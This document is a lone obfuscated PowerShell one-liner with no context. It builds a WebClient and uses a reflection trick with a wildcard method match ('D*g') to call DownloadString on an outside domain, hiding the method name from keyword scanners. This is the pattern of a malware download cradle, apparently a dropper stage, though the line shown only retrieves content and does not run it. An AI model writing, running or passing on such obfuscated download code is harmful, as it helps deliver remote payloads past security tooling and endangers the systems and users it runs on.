([System.Net.WebClient]::New().(((([System.Net.WebClient]::New()).PsObject.Methods)|?{(DIR Variable:_).Value.Name-like'D*g'}).Name)('http://lamacchinadeltuono.it'))
